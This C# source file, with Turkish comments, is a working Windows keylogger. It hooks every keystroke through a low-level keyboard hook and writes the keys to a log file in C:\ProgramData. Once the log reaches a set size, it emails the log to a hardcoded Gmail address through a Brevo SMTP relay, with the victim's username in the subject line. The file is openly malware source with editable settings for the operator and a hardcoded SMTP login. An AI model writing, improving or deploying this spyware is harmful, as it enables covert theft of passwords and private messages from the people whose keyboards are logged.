using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace NTPOdev2
{
    class Program
    {
        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
        // --- Brevo SMTP Settings ---
        private const string SMTP_SERVER = "smtp-relay.brevo.com";
        private const int SMTP_PORT = 587; // Recommended port for TLS/STARTTLS

        // ----------------------------------------------------------------------
        // 2. BREVO AUTHENTICATION CREDENTIALS (MUST BE EXACT)
        // ----------------------------------------------------------------------
        // SMTP Username: This is your Brevo "SMTP Login" (often your signup email)
        private const string SMTP_USERNAME = "98af99001@smtp-brevo.com";

        // SMTP Key (PASSWORD): Use the full, complex, generated key from Brevo's SMTP & API page
        private const string SMTP_KEY = "apikey";

        // ----------------------------------------------------------------------
        // 3. EMAIL/LOG SETTINGS
        // ----------------------------------------------------------------------
        // Gönderen e-posta adresi. Brevo'da "VERIFIED" (kaesoftware@gmail.com) olarak görünüyor.
        private const string SENDER_EMAIL = "kaesoftware@gmail.com";

        // E-postayı alacak olan adres.
        private const string RECIPIENT_EMAIL = "kaesoftware@gmail.com";

        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        // ----------------------------- END -------------------------------- //

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            // Archive and email the log file if the max size has been reached
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    // Copy the log file to the archive
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    // Delete the log file
                    logFile.Delete();

                    // Email the archive and send email using a new thread
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                    mailThread.Start();
                }
                catch(Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }
            
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Assuming you have defined these constants as suggested in the previous step:
        // private const string SMTP_SERVER = "smtp-relay.brevo.com";
        // private const int SMTP_PORT = 587;
        // private const string FROM_EMAIL_ADDRESS = "your_brevo_smtp_login_email";
        // private const string FROM_EMAIL_PASSWORD = "your_brevo_smtp_key";

        public static void sendMail()
        {
            // Dosya içeriğini bu değişkende tutacağız
            string logContent = "Log file not found at the specified path: " + ARCHIVE_FILE_NAME;

            // 1. Kaynakları güvenli bir şekilde yönetmek için using blokları kullanın
            using (var client = new SmtpClient(SMTP_SERVER, SMTP_PORT))
            using (var message = new MailMessage())
            {
                try
                {
                    // İLK HATA DÜZELTMESİ: Gereksiz StreamReader kullanımını kaldırın, File.ReadAllText ile tek seferde okuyun.
                    if (File.Exists(ARCHIVE_FILE_NAME))
                    {
                        // File.ReadAllText otomatik olarak dosyayı okur ve kapatır (kilitlenmeyi önler)
                        logContent = File.ReadAllText(ARCHIVE_FILE_NAME);
                    }

                    // Client Ayarları
                    client.UseDefaultCredentials = false;
                    client.Credentials = new NetworkCredential(SMTP_USERNAME, SMTP_KEY);
                    client.EnableSsl = true;
                    client.Timeout = 20000;

                    // Message Ayarları
                    message.From = new MailAddress(SENDER_EMAIL);
                    message.To.Add(RECIPIENT_EMAIL);
                    message.Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year;
                    message.Body = logContent;
                    message.IsBodyHtml = false;

                    // 2. EK HATA DÜZELTMESİ: Attachment nesnesini de using bloğu içine alın
                    if (INCLUDE_LOG_AS_ATTACHMENT && File.Exists(ARCHIVE_FILE_NAME))
                    {
                        using (Attachment attachment = new Attachment(ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain))
                        {
                            message.Attachments.Add(attachment);

                            // Gönderme işlemini attachment'ın using bloğu içinde tutmak en güvenlisidir.
                            client.Send(message);
                        } // Attachment nesnesi burada Dispose edilir ve dosya kilidi serbest bırakılır.
                    }
                    else
                    {
                        // Ek yoksa gönder
                        client.Send(message);
                    }

                    Console.WriteLine("Email sent successfully!");
                }
                catch (SmtpException ex)
                {
                    // ... (SMTP Hata Yönetimi)
                }
                catch (IOException ex)
                {
                    // Özellikle dosya kilitlenme hatalarını burada yakalayın
                    Console.WriteLine($"G/Ç Hatası: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Genel Hata: {ex.Message}");
                }
            } // MailMessage ve SmtpClient nesneleri burada Dispose edilir.
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
